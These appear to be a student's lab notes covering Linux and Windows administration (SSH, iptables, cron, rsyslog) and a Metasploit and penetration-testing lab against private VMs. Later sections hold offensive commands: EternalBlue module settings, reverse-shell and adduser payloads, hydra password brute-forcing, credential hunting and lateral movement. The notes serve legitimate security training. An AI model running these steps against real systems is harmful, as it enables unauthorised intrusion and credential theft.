#   │            │       └───────────────────────── match anything ending in .iso
#   │            └───────────────────────────────── search the entire filesystem
#   └────────────────────────────────────────────── store each found path in $iso

    echo "Found: $iso"
    # Print what we found

    sudo mkdir -p /mnt/iso
    # Create the mount point if it doesn't exist

    sudo mount -o loop "$iso" /mnt/iso && echo "Mounted $iso at /mnt/iso"
    #            │
    #            └── loop = treat a file as if it were a disk device
    #                       (ISOs are files, not physical disks, so you need this)

    break
    # Stop after the first ISO — without this it would try to mount every ISO
    #   found on the system to the same mount point

OR
- for iso in $(find / -name "*.iso" 2>/dev/null); do sudo mount -o loop "$iso" /mnt/iso


Illustrate how to use fsck and describe what its purpose is

fsck stands for file system check. It scans a filesystem for errors and repairs them - corrupted files, bad locks, broken directory structures, orphaned inodes. When a system crashes, loses power unexpectedly, or a disk starts failing, the filesystem can end up in an inconsistent state. fsck fixes that. 
- never run fsck on a mounted filesystem. It reads and writes directly to the raw disk. Running it on a mounted filesystem while the OS is actively reading and writing to it will cause data corruption. 
# Check if the filesystem is mounted
mount | grep sdb1

# Unmount it first
sudo umount /dev/sdb1

# THEN run fsck
sudo fsck /dev/sdb1



Demonstrate how to ssh to a remote machine. 1. Perform an ssh jump 2. Configure the ssh config file A. include at least two hosts and a proxyjump server 3. Enable ssh forwarding 4. perform ssh local forwarding 5. perform ssh remote forwarding 6. perform ssh to a non-standard port 7. perform ssh to an ipv6 address. If I need any other virtual machines setup for these tasks then please guide me through that first.

CentOS: 192.168.244.131
Kali: 192.168.244.129
Debian: 192.168.244.132
Ubuntu: 192.168.244.130


1. Perform an SSH jump
- Kali > Debian > Ubuntu, in one command. 
- ssh -J <user>@<Debian ip> <user>@<Ubuntu ip>

2. Configure the SSH config file
** Note IdentityFile tells SSH which private key to use when connecting to that host. It's pointing to the key file on your Kali machine. **
# Jump host (Debian)
Host debian-jump
    HostName 192.168.170.131
    User platinum
    IdentityFile ~/.ssh/id_ed25519

# Ubuntu — accessed through the jump host
Host ubuntu
    HostName 192.168.170.132
    User user
    ProxyJump debian-jump
    IdentityFile ~/.ssh/id_ed25519

# CentOS — direct connection, non-standard port (for section 6)
Host centos
    HostName 192.168.170.133
    User user
    Port 2222
    IdentityFile ~/.ssh/id_ed25519

3. Enable SSH forwarding
- sudo vim /etc/ssh/sshd_config 
- AllowTcpForwarding yes
- GatewayPorts yes
- sudo systemctl restart ssh

4. SSH local port forwarding
"I want to reach a service on the remote network from my local machine."
example: apache on the Ubuntu server
- ssh -L 8080:192.168.244.130:80 <user>@192.168.244.128
- curl http://localhost:8080
- now you'll be viewing Ubuntu's webpage, tunneled through Debian
- background tunnel (no shell): ssh -fN -L 8080:192.168.170.132:80 platinum@192.168.170.131

Another example like vsftp and smb:



5. SSH remote port forwarding
"I want a remote machine to be able to reach something on MY machine"
Scenario: Running a web server on Kali. You want Debian to be able to access it on its own localhost:9090
- Start a web server on Kali:
	- mkdir /tmp/serve
	- echo "hello from kali" > /tmp/serve/index.html
	- cd /tmp/serve
	- python3 -m http.server 80

Revisit



6. SSH to a non-standard port
By default SSH runs on port 22. Changing it is a common hardening technique.
- # Specify the port with -p
ssh -p 2222 user@192.168.170.133

7. SSH to an IPv6 address
- find link-local addresses: ip -6 a | grep fe80
- to ssh to a fe80 (link local) ipv6 address you need to use % to indicate which NIC
- ex. ssh <user>@fe80::20c:29ff:fe4a:7b2e%ens33



Create a bash script that sets up your interfaces, updates your system, opens your terminals, and opens firefox. 

#!/bin/bash

echo "================================="
echo "   System Startup Script"
echo "================================="

# --- Set up interfaces ---
echo "[*] Configuring network interfaces..."
sudo ip link set ens33 up
sudo dhclient ens33 2>/dev/null
echo "[+] Network interface ens33 is up"

# Show your IP so you know what it is
IP=$(ip -4 addr show ens33 | grep inet | awk '{print $2}')
echo "[+] Your IP: $IP"

# --- Update the system ---
echo "[*] Updating system..."
sudo apt update && sudo apt upgrade -y
echo "[+] System updated"

# --- Open terminals with tmux ---
echo "[*] Starting tmux session..."
tmux new-session -d -s work

# First pane: general workspace
tmux rename-window -t work:0 'workspace'

# Second window: logs
tmux new-window -t work -n 'logs'
tmux send-keys -t work:logs 'sudo journalctl -p err -f' Enter

# Third window: network monitoring
tmux new-window -t work -n 'network'
tmux send-keys -t work:network 'sudo ss -tanp' Enter

echo "[+] tmux session 'work' created with 3 windows"

# --- Open Firefox ---
echo "[*] Opening Firefox..."
firefox &>/dev/null &
echo "[+] Firefox launched"

# --- Summary ---
echo ""
echo "================================="
echo "   Startup Complete"
echo "================================="
echo "   IP Address: $IP"
echo "   tmux session: work"
echo "   Attach with: tmux attach -t work"
echo "================================="

Demonstrate how to view system resources:
	1. top
	2. htop
	3. ps (ps aux) 

Demonstrate how to find and manipulate files and directories:
	1. find
	2. cp
	3. locate
	4. dd
	5. grep
	6. vim

1. Find searches the file system in real time by crawling through directories. Slower than locate but powerful with filtering. 
- syntax: find WHERE WHAT ACTION
# Find a file by exact name
find / -name "passwd" 2>/dev/null
# Case-insensitive search
find / -iname "passwd" 2>/dev/null
# Search only in a specific directory (faster)
find /etc -name "*.conf"
find /home -name "*.txt"
# Config files containing passwords
find /etc -name "*.conf" -exec grep -li "password" {} \; 2>/dev/null
2. Cp copies files and directories
# Copy a directory (MUST use -r for recursive)
cp -r /home/platinum/myproject /tmp/project_backup
3. Locate is fast file search from a database. 
# Install
sudo apt install mlocate -y       # Debian/Ubuntu
sudo dnf install mlocate -y       # CentOS
# Build the database (must run first, or results will be empty)
sudo updatedb
4. dd copies data at the raw block level - byte for byte. 
- syntax: dd if=INPUT of=OUTPUT bs=BLOCKSIZE count=BLOCKS
- useful for forensics
5. grep 
# Search for text in a file
grep "password" /etc/ssh/sshd_config
# Search in multiple files
grep "error" /var/log/*.log

Demonstrate how to use compression and encryption tools:
	1. tar
	2. xz
	3. 7zip
	4. bz
	5. gunzip
	6. zip

Compression reduces file size by finding patterns in data and encoding them more efficiently. Different algorithms trade off between compression ratio and speed. 

Tar doesn't compress by itself, it bundles multiple files and directories into a single file called a tarball. You then apply compression on top with gzip, bzip2, or xz. 

# Bundle without compression (just a tarball)
tar -cvf archive.tar /home/platinum/myproject
# Bundle + gzip compression (most common)
tar -czvf archive.tar.gz /home/platinum/myproject
# Extract gzip tarball (to current directory)
tar -xzvf archive.tar.gz
# Extract to a specific directory
tar -xzvf archive.tar.gz -C /tmp/extracted/

xz provides the best compression ratio of the standard Linux tools. Use this when size matters over speed. 
# Compress a file (replaces original with .xz version)
xz file.txt
# Decompress (replaces .xz with original)
xz -d file.txt.xz


Demonstrate how to manipulate running applications with systemctl (stop, start, enable, and restart), explain where the files are that control systemctl configuration of those applications. 1. Explain what systemd is

# Start a service right now
sudo systemctl start ssh

# Stop a service
sudo systemctl stop ssh

# Restart a service (stop then start)
sudo systemctl restart ssh

# Reload config without full restart (not all services support this)
sudo systemctl reload ssh

# Check current status
sudo systemctl status ssh

# Enable — start automatically on boot
sudo systemctl enable ssh

# Disable — don't start on boot
sudo systemctl disable ssh

# Enable AND start in one command
sudo systemctl enable --now ssh

# Disable AND stop in one command
sudo systemctl disable --now ssh

Where the unit files live:
/etc/systemd/system/          # Admin overrides and custom services (HIGHEST priority)
/run/systemd/system/          # Runtime units (temporary, disappear on reboot)
/lib/systemd/system/          # Package-installed defaults (LOWEST priority)


Demonstrate how to set a crontab to run at boot, and at set intervals

Cron is a scheduler that runs commands or scripts automatically at specified times or intervals. It's the oldest way to automate tasks on Linux. 
# Edit your user's crontab
crontab -e
# View your current crontab
crontab -l

Every crontab follows this pattern:

* * * * * command_to_run
│ │ │ │ │
│ │ │ │ └── Day of week (0-7, 0 and 7 are Sunday)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)

30 2 * * * /home/platinum/backup.sh
│  │ │ │ │
│  │ │ │ └── Every day of the week
│  │ │ └──── Every month
│  │ └────── Every day of the month
│  └──────── At 2 AM (hour 2)
└────────── At minute 30

= Runs at 2:30 AM every day

- Run crontab on boot: @reboot /home/platinum/startup.sh


Revisit this^



Demonstrate how to kill running processes
# Find by name
ps aux | grep firefox

# Find by port (what's using port 8080?)
sudo lsof -i :8080

# Find by PID
ps -p 1234

# Interactive (htop — select and kill visually)
htop

# Graceful kill (asks the process to stop)
kill 1234
or kill -9 1234 for forceful kill



How do you determine with ps aux or htop what PID to use to kill for certain running processes that you want to kill? 

second column in ps aux denotes the PID. Use ps aux | grep [f]irefox to search for the firefox running process. kill <PID>

Demonstrate how to use chown and chmod on an individual file and recursively. Explain what the permissions descriptors mean, i.e what is 777, what is "drwxr-xr-x"

-rwxr-xr-x
- rwx   r-x  r-x
│├──┤├──┤├──┤
│ │    │     │
│ │    │     └── Others (everyone else)
│ │    └────── Group (users in the file's group)
│ └────────── Owner (the user who owns the file)
└──────────── File type

- is a regular file
d is a directory
l is a symbolic link
b is a block device (disk)
c character device (terminal)

r is read perm (4)
w is write perm (2)
x is execution perm (1)
- not allowed (0)

So the above is a regular file that the owner has read, write, execute perms to. Groups and others can read and execute but not write. This would be 755
Chmod lets you change permissions

Recursive means apply to directory and everything inside
Chown is changing ownership
# Change owner and group
sudo chown newuser:newgroup file.txt


Demonstrate where to find optionally installed files, the location for user binaries, and where you would find system binaries. Explain the general Linux file structure. 

/
├── bin/         Essential user binaries
├── sbin/        Essential system binaries
├── usr/         Secondary programs and libraries
│   ├── bin/     Most user commands live here
│   ├── sbin/    Most system commands live here
│   ├── lib/     Libraries for /usr/bin and /usr/sbin
│   ├── local/   Manually compiled/installed software
│   │   ├── bin/
│   │   ├── sbin/
│   │   └── lib/
│   └── share/   Architecture-independent data (docs, man pages)
├── opt/         Optionally installed software
├── etc/         Configuration files
├── home/        User home directories
├── root/        Root user's home directory
├── var/         Variable data (logs, databases, mail, websites)
│   ├── log/     Log files
│   ├── www/     Web server files
│   ├── tmp/     Temporary files that survive reboot
│   └── spool/   Print queues, mail queues, cron
├── tmp/         Temporary files (cleared on reboot)
├── dev/         Device files
├── proc/        Virtual filesystem — running process info
├── sys/         Virtual filesystem — hardware/kernel info
├── mnt/         Temporary mount points
├── media/       Removable media (USB drives, CDs)
├── boot/        Kernel and bootloader files
├── lib/         Essential shared libraries
├── run/         Runtime data (PIDs, sockets)
└── srv/         Service data (FTP, HTTP served files)

1. User binaries — /usr/bin/ (and /bin/)
This is where normal user commands live — the programs anyone can run.
2. System binaries — /usr/sbin/ (and /sbin/)
System administration commands that typically require root/sudo to run.
3. Optionally installed software — /opt/
Software that doesn't come from the distro's package manager — third-party commercial software, manually downloaded tools, self-contained applications.


Draw out the OSI model, and expain what ypes of protocols or services are in each category.


OSI MODEL
=========

Layer | Name         | What it does              | Protocols / Services                        | Data Unit | Devices
------+--------------+---------------------------+---------------------------------------------+-----------+------------------
  7   | Application  | User interaction          | HTTP, HTTPS, FTP, SSH, DNS, SMTP, POP3,     | Data      | Firewalls (L7)
      |              | What you see and use      | IMAP, SNMP, DHCP, Telnet, SMB, LDAP         |           |
------+--------------+---------------------------+---------------------------------------------+-----------+------------------
  6   | Presentation | Translation / format      | SSL/TLS, JPEG, GIF, PNG, ASCII, Unicode,    | Data      |
      |              | Encryption, compression   | MPEG, encryption, compression                |           |
------+--------------+---------------------------+---------------------------------------------+-----------+------------------
  5   | Session      | Connection management     | NetBIOS, RPC, PPTP, SIP, SMB sessions       | Data      |
      |              | Establish, maintain, end  |                                             |           |
------+--------------+---------------------------+---------------------------------------------+-----------+------------------
  4   | Transport    | Reliable delivery         | TCP, UDP                                    | Segment   | Load balancers
      |              | Port numbers live here    | Port numbers (22, 80, 443, 445)             | (TCP)     |
      |              | Segmentation, flow ctrl   | Segmentation, flow control                  | Datagram  |
      |              |                           |                                             | (UDP)     |
------+--------------+---------------------------+---------------------------------------------+-----------+------------------
  3   | Network      | Routing / addressing      | IP (IPv4, IPv6), ICMP, IPsec                | Packet    | Routers
      |              | IP addresses live here    | OSPF, BGP, RIP                              |           | L3 switches
      |              | Gets packets between nets |                                             |           |
------+--------------+---------------------------+---------------------------------------------+-----------+------------------
  2   | Data Link    | MAC addressing            | Ethernet, Wi-Fi (802.11), ARP               | Frame     | Switches
      |              | Local network delivery    | PPP, VLAN (802.1Q)                          |           | Bridges, NICs
      |              | Same-segment comms        |                                             |           |
------+--------------+---------------------------+---------------------------------------------+-----------+------------------
  1   | Physical     | Bits on the wire          | Ethernet cables, fiber optic                | Bits      | Hubs, repeaters
      |              | Raw signals / electricity | Wi-Fi radio, USB, Bluetooth                 |           | Modems
      |              | Actual hardware           |                                             


Configure interfaces - Linux: 1. Configure a VM to have two interfaces. A. Use netplan and /etc/networks B. Configure a route to a remote system not on your primary subnet, but reachable through another machine on your machine.


Debian uses /etc/network/interfaces by default

Netplan can be used with Ubuntu (.yml)

Revisit this^


Step 1 - On CentOS — enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1
# Make it permanent
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
sudo ip addr add 172.16.0.1/24 dev ens224
sudo ip link set ens224 up

Step 2 — On Debian, add a route
Tell Debian "to reach 172.16.0.0/24, send traffic to CentOS through the network you already share":
sudo ip route add 172.16.0.0/24 via 192.168.244.131



Illustrate how you can use tcpdump to troubleshoot connectivity issues between systems

sudo tcpdump -i ens33 -nn host REMOTE_IP
- If target isn't replying but is receiving requests it's likely a firewall:
# On CentOS — check firewall
sudo iptables -L INPUT -n -v | grep icmp
sudo firewall-cmd --list-all

What you'll see for different problems
SSH not installed/running on Ubuntu:
10:30:01 IP 192.168.170.131.54321 > 192.168.170.132.22: Flags [S]
10:30:01 IP 192.168.170.132.22 > 192.168.170.131.54321: Flags [R.]
SYN goes out, RST (reset) comes back. The port is closed — Ubuntu received the packet but nothing is listening on port 22. Fix: sudo systemctl start ssh on Ubuntu.
Firewall blocking SSH on Ubuntu:
10:30:01 IP 192.168.170.131.54321 > 192.168.170.132.22: Flags [S]
10:30:04 IP 192.168.170.131.54321 > 192.168.170.132.22: Flags [S]
10:30:07 IP 192.168.170.131.54321 > 192.168.170.132.22: Flags [S]
SYN goes out, nothing comes back, SYN retransmits. The firewall is silently dropping packets. Fix: sudo iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT on Ubuntu.


Demonstrate how to enable IPv4 forwarding on your Linux machine. Ensure it survives a reboot.

cat /proc/sys/net/ipv4/ip_forward
- 0 means disabled 1 means enabled 
Enable it:
- sudo sysctl -w net.ipv4.ip_forward=1
Survive reboot:
- sudo vim /etc/sysctl.conf
- ensure net.ipv4.ip_forward=1 is in the .conf file
- apply without rebooting: sudo sysctl -p

Utilize both the GUI and powershell to disable the firewall on Windows. 

Open PowerShell as Administrator (right-click → Run as administrator):
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False


Demonstrate knowledge of iptables: 1. Block all traffic except ssh 2. Redirect traffic from one subnet to another subnet while making it look like it comes from the destination subnet 3. Log any traffic not allowed through the firewall

1. Flush all existing rules:
sudo iptables -F
sudo iptables -t nat -F
2. Reset default policies to accept
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
3. Verify
sudo iptables -L -n -v

4. Block all traffic except SSH
# Rule 1: Allow loopback (machine talking to itself — always allow)
sudo iptables -A INPUT -i lo -j ACCEPT
# Rule 2: Allow established/related connections
# (responses to connections YOU initiated come back through INPUT)
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
# Rule 3: Allow SSH inbound (port 22 TCP)
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
# Rule 4: Drop invalid packets
sudo iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
# Rule 5: Set default policy — drop everything else
sudo iptables -P INPUT DROP
# Allow all outbound (so you can still reach the internet, apt update, etc.)
sudo iptables -P OUTPUT ACCEPT

5. Redirect traffic from one subnet to another (NAT masquerading)
Ex. This makes traffic from my 192.168.244.0/24 subnet look like it comes from 172.16.0.0/24 when it reaches the destination on my CentOS VM. 
- Enable IP forwarding on CentOS
# Allow forwarding between the two subnets
sudo iptables -A FORWARD -s 192.168.170.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.170.0/24 -j ACCEPT
# NAT — masquerade traffic leaving toward 172.16.0.0/24
# This rewrites the source IP to CentOS's 172.16.0.1 address
sudo iptables -t nat -A POSTROUTING -s 192.168.170.0/24 -o ens36 -j MASQUERADE
The masquerade rule uses the nat table (-t nat) and the POSTROUTING chain (after the routing decision is made, right before the packet leaves the interface).
Verify: sudo iptables -L -n -v
sudo tcpdump -i ens33 -nn
sudo systemctl stop firewalld
sudo systemctl disable firewalld

# Flush everything
sudo iptables -F

# Allow loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Allow established/related
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow SSH
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow FORWARD between subnets (your NAT routing)
sudo iptables -A FORWARD -s 192.168.244.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.244.0/24 -j ACCEPT

# LOG anything that wasn't allowed on INPUT
sudo iptables -A INPUT -m limit --limit 5/min --limit-burst 10 -j LOG --log-prefix "DROPPED-INPUT: " --log-level 4

# LOG anything that wasn't allowed on FORWARD
sudo iptables -A FORWARD -m limit --limit 5/min --limit-burst 10 -j LOG --log-prefix "DROPPED-FORWARD: " --log-level 4

# Drop everything else
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

***IMPORTANT NOTE***
iptables -F flushes rules only. -P sets policy. They're separate. If you set the policy to DROP and then flush, you end up with no rules and a default DROP — which blocks everything. 


Demonstrate the configuration of remote logging with rsyslog

Instead of each machine keeping its own logs locally, you send logs to a central log server. 
1. sudo apt install rsyslog -y
2. vim /etc/rsyslog.conf
3. Uncomment modules for udp and tcp
4. Add this before the existing rules in /etc/rsyslog.conf (right after the module lines you just uncommented):
# Create separate log files per remote host
$template RemoteLogs,"/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log"
# Store remote logs using the template
# Stop processing so they don't also go into local syslog
if $fromhost-ip != '127.0.0.1' then ?RemoteLogs
& stop
5. Create the log directory
sudo mkdir -p /var/log/remote
sudo chown root:adm /var/log/remote
6. Allow port 514 through firewall
sudo iptables -A INPUT -p tcp --dport 514 -j ACCEPT
sudo iptables -A INPUT -p udp --dport 514 -j ACCEPT
7. Enable remote host as listener 
vim /etc/rsyslog.conf
Add to bottom of file:
*.* @@<log_server_ip>:514
8. Check and set hostname of servers
hostname
sudo hostnamectl set-hostname <name>
9. Restart rsyslog
10. Test: logger "test logs"

# Check if CentOS can reach Debian on port 514
nc -zv 192.168.244.132 514

Demonstrate how to see active running process in windows.  Use both CLI and powershell. Show where that process spawns within the file directory

CLI
tasklist to list running processes
Powershell
Get-Process
Show where in file directory:
cmdwmic process where "name='firefox.exe'" get Name,ProcessId,ExecutablePath
PowerShell
powershellGet-Process firefox | Select-Object Id, ProcessName, Path

Demonstrate how to map a network drive in windows

cmd# Map a drive
net use Z: \\192.168.170.133\SharedFolder

# Map with credentials
net use Z: \\192.168.170.133\SharedFolder /user:username password

# Map and persist across reboots
net use Z: \\192.168.170.133\SharedFolder /persistent:yes

Demonstrate how to tasklist and taskkill

# Show with full detail
tasklist /v
# Show which DLLs each process loaded
tasklist /m
# Show services running inside each process
tasklist /svc
# Filter by name
tasklist /fi "imagename eq firefox.exe"
# Filter by PID
tasklist /fi "pid eq 1234"
cmd# Kill by name
taskkill /im firefox.exe
# Kill by PID
taskkill /pid 5678
# Force kill
taskkill /f /im firefox.exe
taskkill /f /pid 5678

Demonstrate how to view Windows logs, explain what each log category is

1. Navigate to Event Viewer
2. Expand Windows Logs
- categories: application, security, setup, system, and forwarded events

Demonstrate how to schedule a recurring task in windows

1. Navigate to Task Scheduler
2. Create Basic Task 
3. Name it
4. Trigger: Choose when it runs
5. Action: choose Start a program
6. Select program/script
7. Add any flags the program needs

Demonstrate how to use windows cli: 1. find a file 2. read a file 3. Create a file 4. Change file permissions (icacls) 5. List users 6. List groups 7. List shares 8. Create a share 9. Create a group 10. create a user.

WINDOWS CMD REFERENCE
=====================

1. FIND A FILE
   dir /s /p C:\filename.txt
   where /r C:\ filename.txt

2. READ A FILE
   type C:\path\file.txt

3. CREATE A FILE
   echo Hello World > newfile.txt
   echo Another line >> newfile.txt
   mkdir C:\newfolder

4. CHANGE PERMISSIONS (icacls)
   icacls file.txt                          View permissions
   icacls file.txt /grant blake:(F)         Full control
   icacls file.txt /grant blake:(R)         Read only
   icacls file.txt /grant blake:(M)         Modify
   icacls file.txt /deny blake:(W)          Deny write
   icacls file.txt /remove blake            Remove all permissions
   icacls folder /grant blake:(F) /T        Recursive
   icacls file.txt /setowner blake          Change owner
   F=Full  M=Modify  RX=Read/Execute  R=Read  W=Write  D=Delete

5. LIST USERS
   net user
   net user blake

6. LIST GROUPS
   net localgroup
   net localgroup Administrators

7. LIST SHARES
   net share

8. CREATE A SHARE
   net share MyShare=C:\SharedFolder /grant:Everyone,FULL
   net share MyShare /delete

9. CREATE A GROUP
   net localgroup CyberTeam /add
   net localgroup CyberTeam blake /add
   net localgroup CyberTeam /delete

10. CREATE A USER
    net user newuser Password123! /add
    net localgroup Administrators newuser /add
    net user newuser /active:no
    net user newuser /delete`1


Demonstrate starting Metasploit
- Ensure the backend database is running prior to initialization and connected. 

Metasplloit uses PostgresSQL to store scan results, credentials, loot, and session history. 
sudo systemctl start postgresql
sudo systemctl enable PostgreSQL
sudo msfdb init
msfconsole
db_status to check status of database


Demonstrate how to search for an auxiliar scanner in Metasploit

Inside msfconsole
bash# Search all auxiliary scanners
search type:auxiliary path:scanner

# Search scanners for a specific protocol
search type:auxiliary path:scanner/smb
search type:auxiliary path:scanner/ssh
search type:auxiliary path:scanner/http

# Select it
use auxiliary/scanner/smb/smb_version

# See what needs to be configured
show options

# Set target
set RHOSTS 192.168.170.0/24

# Run it
run

Demonstrate how to search for an exploit in Metasploit

# Search by platform
search type:exploit platform:windows
search type:exploit platform:linux

Demonstrate how to select an exploit from the search menu in Metasploit

From the search results, use the number on the left:

msf6> search type:exploit smb
use 0


Demonstrate how to use an auxiliary scanner via the full path to that utility and how to show basic options for that capability. Demonstrate how to show advanced options for a selected capability.

# Select the scanner by full path
msf6> use auxiliary/scanner/smb/smb_version

# See what needs to be configured
msf6 auxiliary(scanner/smb/smb_version)> show options

# Advanced options (hidden settings most people don't see)
msf6 auxiliary(scanner/smb/smb_version)> show advanced

# Evasion options (IDS/IPS bypass settings)
msf6 auxiliary(scanner/smb/smb_version)> show evasion


Demonstrate how to set the remote host, remote target port, local host, and local port for a selected capability

# Remote host (target)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set RHOSTS 192.168.170.135

# Remote port (target's port)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set RPORT 445

# Local host (your Kali IP — where the shell connects back to)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set LHOST 192.168.170.128

# Local port (port on your Kali that catches the shell)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set LPORT 4444

# Verify everything is set
msf6 exploit(windows/smb/ms17_010_eternalblue)> show options

# Target a whole subnet instead of one host
msf6 exploit(windows/smb/ms17_010_eternalblue)> set RHOSTS 192.168.170.0/24

# Target multiple specific hosts
msf6 exploit(windows/smb/ms17_010_eternalblue)> set RHOSTS 192.168.170.131 192.168.170.133 192.168.170.135

# Make settings persist across module changes (global)
msf6> setg LHOST 192.168.170.128
msf6> setg LPORT 4444

# Clear a setting
msf6> unset RHOSTS

# Clear a global setting
msf6> unsetg LHOST


Demonstrate how to set username and password for a remote host for a selected capability

# Single username and password
msf6 auxiliary(scanner/ssh/ssh_login)> set USERNAME admin
msf6 auxiliary(scanner/ssh/ssh_login)> set PASSWORD Password123!

# SMB modules use a different variable name
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMBUser admin
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMBPass Password123!


Demonstrate how to scan for SMB shares in Metasploit

# Select the SMB share scanner
msf6> use auxiliary/scanner/smb/smb_enumshares

# Set the target
msf6 auxiliary(scanner/smb/smb_enumshares)> set RHOSTS 192.168.170.0/24

# Set credentials if you have them
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMBUser admin
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMBPass Password123!

# Or try without creds (null session)
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMBUser ""
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMBPass ""

# Speed it up
msf6 auxiliary(scanner/smb/smb_enumshares)> set THREADS 10

# Run it
msf6 auxiliary(scanner/smb/smb_enumshares)> run

Demonstrate how to specify SMB versions in Metasploit

# Select an SMB module
msf6> use auxiliary/scanner/smb/smb_enumshares

# Show advanced options to find SMB version settings
msf6 auxiliary(scanner/smb/smb_enumshares)> show advanced

# Force a specific SMB version
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMB::ProtocolVersion 1
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMB::ProtocolVersion 2
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMB::ProtocolVersion 3

# Allow multiple versions (let it negotiate)
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMB::ProtocolVersion 1,2
msf6 auxiliary(scanner/smb/smb_enumshares)> set SMB::ProtocolVersion 1,2,3

# Verify
msf6 auxiliary(scanner/smb/smb_enumshares)> show advanced

Demonstrate how to select and assign a payload other than meterpreter in Metasploit

# Select an exploit first
msf6> use exploit/windows/smb/ms17_010_eternalblue

# Show all compatible payloads for this exploit
msf6 exploit(windows/smb/ms17_010_eternalblue)> show payloads

# Set a basic Windows command shell (reverse)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set PAYLOAD windows/x64/shell_reverse_tcp

# Set a basic Windows command shell (bind)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set PAYLOAD windows/x64/shell_bind_tcp

# Linux reverse shell
msf6 exploit(multi/handler)> set PAYLOAD linux/x64/shell_reverse_tcp

# Linux bind shell
msf6 exploit(multi/handler)> set PAYLOAD linux/x64/shell_bind_tcp

# Basic command execution (runs one command, no persistent shell)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set PAYLOAD generic/shell_reverse_tcp

# VNC (gives you a graphical view of the target's desktop)
msf6 exploit(windows/smb/ms17_010_eternalblue)> set PAYLOAD windows/vncinject/reverse_tcp

# Add user account on the target
msf6 exploit(windows/smb/ms17_010_eternalblue)> set PAYLOAD windows/adduser

# Execute a specific command
msf6 exploit(windows/smb/ms17_010_eternalblue)> set PAYLOAD windows/exec
msf6 exploit(windows/smb/ms17_010_eternalblue)> set CMD "net user hacker Password1! /add"

# Set required options after choosing payload
msf6 exploit(windows/smb/ms17_010_eternalblue)> set LHOST 192.168.170.128
msf6 exploit(windows/smb/ms17_010_eternalblue)> set LPORT 4444

# Verify everything
msf6 exploit(windows/smb/ms17_010_eternalblue)> show options

# Run it
msf6 exploit(windows/smb/ms17_010_eternalblue)> exploit

Full Lab 1

YOUR MACHINE                   COMPANY NETWORK
                          
Kali (attacker)          Debian (web server - DMZ)
192.168.244.129    →     192.168.244.132
                              │
                         CentOS (internal app server)
                         192.168.244.131
                              │
                         Ubuntu (database server - the prize)
                         192.168.244.130

Reconnaissance: Find targets

1. Scan the network to find live hosts and services running
- nmap -sn 192.168.244.0/24
2. Scan hosts you find on the network (192.168.244.132, 131, 130)
- nmap -sV -sC 192.168.244.132 -oN scan132.txt
	- sV probes open ports
	- sC runs default NSE script to gather extra info
	- oN saves output to a file
- each port that shows in nmap output is an attack vector

Enumeration: Info gathering and diving deeper

1. Check ftp on 192.168.224.132
2. Curl http://192.168.244.132
# Scan for hidden directories
dirb http://192.168.244.132
- What dirb does: Brute-forces directory names against a wordlist. It tries /admin, /backup, /config, /uploads, thousands of common paths.
curl http://192.168.244.132/backup/
curl http://192.168.244.132/backup/creds.txt
3. Try brute force if you don't find anything like above
-  hydra -l webdev -P /usr/share/wordlists/rockyou.txt ssh://192.168.244.132 -t 4 -f
- ensure that rockyou.txt is unzipped with gunzip: gunzip filename.txt.gz   
What Hydra does: Tries every password in rockyou.txt for the username webdev. The -f flag stops after the first success. -t 4 limits to 4 threads so you don't overwhelm the target.

# Install seclists if you don't have it to brute force both usernames and passwords
sudo apt install seclists -y

# Brute force with a small username list + rockyou
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.244.132 -t 4 -f

4. ssh webdev@192.168.244.132 with password obtained via hydra
- Look around:
# Who am I?
whoami
# What can I sudo?
sudo -l
# Probably nothing — webdev isn't an admin
# What's on this machine?
ls -a /home/
ls /var/www/html/
cat /var/www/html/backup/creds.txt
# What else is on the network? (from Debian's perspective)
ip a
ip route
arp -a
# What's listening locally?
ss -tlnp
5. Move laterally to another host with credentials you found
- ssh admin@192.168.244.131
6. Enumerate new host
7. Check what centos can reach:
- # Can CentOS reach Ubuntu's SSH?
nc -zv 192.168.244.130 22
8. Try to reverse tunnel back to Kali from CentOS
- # On CentOS, try to reverse tunnel back to Kali
ssh -R 9050 kali_user@192.168.244.129
9. Fails -> check iptables
- sudo iptables -L OUTPUT -n -v
- sudo iptables -L -v -n
- Firewalls block reverse tunnels. Egress filtering to block compromised machines from calling home. 
10. Since CentOS can't reach back to you, but you CAN reach CentOS (you're SSH'd into it through Debian), use iptables on CentOS to forward traffic to Ubuntu.
